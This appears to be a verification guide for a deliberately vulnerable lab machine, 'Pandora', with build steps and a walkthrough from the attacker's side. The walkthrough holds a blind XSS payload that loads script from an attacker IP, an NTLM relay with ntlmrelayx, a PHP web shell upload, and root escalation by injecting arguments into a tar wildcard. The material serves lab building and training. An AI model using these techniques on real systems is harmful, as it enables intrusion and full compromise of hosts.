# Pandora Machine Verification

## 1. Build Verification
Run the following command in `machines/Pandora`:
```bash
docker-compose build
```
Expected Output: Successful build of `pandora` image.

## 2. Service Verification
Start the machine:
```bash
docker-compose up -d
```
Check running services:
- **Port 80**: HTTP (Web App)
- **Port 445**: SMB (Samba)

## 3. Exploit Walkthrough (Attacker View)

### Step 1: Blind XSS
1.  Navigate to `http://<TARGET_IP>:8085/`.
2.  Submit a ticket with:
    -   Email: `attacker@evil.com`
    -   Message: `My printer is broken.`
    -   **Intercept Request** (Burp Suite) and change `User-Agent` to:
        `<script src="http://10.10.14.x/auth"></script>`
3.  Start `ntlmrelayx`:
    ```bash
    impacket-ntlmrelayx -t smb://<TARGET_IP> -smb2support -i
    ```
    (Note: `-i` for interactive shell, or `-c` to execute command).

### Step 2: NTLM Relay & RCE
1.  Wait for the Bot (approx 10s).
2.  `ntlmrelayx` should receive a connection from `WORKGROUP\admin`.
3.  It relays to the SMB server.
4.  If successful, it dumps the SAM or gives an interactive SMB shell.
5.  Use the interactive shell to upload a PHP shell to `/var/www/html/tickets/shell.php`.
    ```bash
    put shell.php
    ```
6.  Access `http://<TARGET_IP>:8085/tickets/shell.php` to get RCE as `www-data`.

### Step 3: Privilege Escalation
1.  On the reverse shell:
    ```bash
    /usr/local/bin/check_status
    ```
2.  Select option `3` (Backup Logs).
3.  Exploit `tar *`:
    -   Create files in `/var/www/html/tickets/`:
        ```bash
        touch -- "--checkpoint=1"
        touch -- "--checkpoint-action=exec=sh shell.sh"
        echo "chmod +s /bin/bash" > shell.sh
        chmod +x shell.sh
        ```
    -   Run `/usr/local/bin/check_status` and choose `3`.
4.  `tar` executes `shell.sh`, making `/bin/bash` SUID.
5.  Run `/bin/bash -p` to get Root.
